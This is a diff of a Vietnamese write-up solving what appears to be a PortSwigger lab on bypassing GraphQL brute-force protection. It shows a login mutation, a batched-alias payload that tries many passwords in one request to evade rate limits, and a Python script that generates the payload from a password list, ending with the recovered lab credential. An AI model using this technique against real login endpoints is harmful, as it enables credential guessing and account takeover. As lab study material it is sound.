@@ -234,7 +234,49 @@ For more information on using InQL, see Working with GraphQL in Burp Suite.
 ```
 * Exploit:
 
-Đoạn code sinh payload: 
+Truy cập vào chức năng login và thử đăng nhập bằng user/pass bất kỳ => Phát hiện link GraphAPI `POST /graphql/v1`
+
+![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/ef897054-22ba-498b-af7e-1175d116c095)
+
+Copy URL cho vào InQL Scanner => Phát hiện mutaion login như sau:
+
+![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5eb8a3f6-263d-4901-a8b4-faafd41b5dee)
+
+Query Payload:
+
+```
+mutation {
+	login(input:{password: "code*", username: "code*"}) {
+		token
+		success
+	}
+}
+```
+
+=> Ta cần sinh payload dạng như sau (Dùng Alias để hạn chế Rate limit - Chỉ 1 HTTP request duy nhất để bruteforce nhiều password):
+
+```
+    mutation {
+        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
+              token
+              success
+          }
+
+          bruteforce1:login(input:{password: "password", username: "carlos"}) {
+              token
+              success
+          }
+
+    ...
+
+          bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
+              token
+              success
+          }
+    }
+```
+
+Ta sử dụng đoạn code sinh payload như sau để gen payload với toàn bộ password lưu sẵn trong file `pass.txt`: 
 
 ```python
 input1 = "(input:{password: "
@@ -252,3 +294,12 @@ with open('pass.txt') as f:
         output = "bruteForce" + str(i) + ":login" + input1 + "\\\"" + line.strip() + input2
         print(output)
 ```
+
+=> Dùng payload sinh được cho vào Request => Tìm ra password là `buster`
+
+![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/68772c5b-d96c-4c55-90b4-9b2ceff78c40)
+
+Đăng nhập vào hệ thống bằng user `carlos:buster` => LAB SOLVED!
+
+![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/d306f1f3-845e-483b-8cd7-6ed66dfc2c47)
+
